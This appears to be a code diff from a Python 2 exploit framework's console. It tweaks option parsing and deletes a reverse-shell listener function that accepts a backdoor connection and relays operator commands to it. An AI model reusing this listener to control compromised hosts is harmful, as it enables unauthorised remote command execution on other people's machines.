@@ -48,7 +48,7 @@ def read_cmd_lines(PL_PWD,poc_re,PL_POC_FILE, poc_module_path_first_name, poc_mo
             return
         else:
             if poc_shell_input[:3] == const.PL_SET:
-                poc_shell = poc_shell_input[3:].strip().lower()
+                poc_shell = poc_shell_input[3:].strip()
                 if poc_shell == None:
                     pass
                 else:
@@ -83,7 +83,7 @@ def read_cmd_lines(PL_PWD,poc_re,PL_POC_FILE, poc_module_path_first_name, poc_mo
                 usage()
             elif poc_shell_input[:5] == "unset":
                 try:
-                    poc_shell = poc_shell_input[5:].strip().lower()
+                    poc_shell = poc_shell_input[5:].strip()
                     print poc_shell
                     for option, option_filter in poc.option.items():
                         if poc_shell == option:
@@ -112,8 +112,8 @@ def read_cmd_lines(PL_PWD,poc_re,PL_POC_FILE, poc_module_path_first_name, poc_mo
                     else:
                         print setcolor.set_red(" [!] ") + "没有找到此模块 => ".decode('utf-8') + PL_POC_FILE
  
-                #监听shell,暂不开放
-            #elif poc_shell_input[:10] == "set hander":
+                #监听shell,暂未写
+            #elif poc_shell_input[:11] == "set payload":
                 #poc_shell = poc_shell_input[10:].strip().lower()
                 #if poc_shell == None:
                     #pass
@@ -126,41 +126,6 @@ def read_cmd_lines(PL_PWD,poc_re,PL_POC_FILE, poc_module_path_first_name, poc_mo
 
 #-------------------------------------------------------------------------------
 
-
-#设置hander模块，
-def pl_set_hander(poc):
-    if poc.hander.listen:
-        lhost = poc.hander.LHOST
-        lport = poc.hander.LPORT
-        pl_hander_loop(lhost,lport)
-
-
-#监听端口
-def pl_hander_loop(lhost,lport):
-    #接收shell和发送客户端信息
-    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server.bind((lhost, lport))
-    server.listen(1)
-    BUFSIZ = 2048
-    print "[+] Start Listening host %s..." %lhost
-    print "[+] Start Listening port %s..." %lport
-    while True:
-        #接收shell和发送客户端信息
-        client, addr = server.accept()
-        data = raw_input('pl_shell >')
-        try:
-            client.send(data.encode('utf-8'))
-            if data.upper()=="BACK":
-                break
-            #backdoor出错必须返回空，否则将死循环
-            os_result = client.recv(BUFSIZ)
-            if os_result == "":
-                client.close()
-                break
-        except:
-            client.close()
-            break
-        print (os_result)
 
 
 
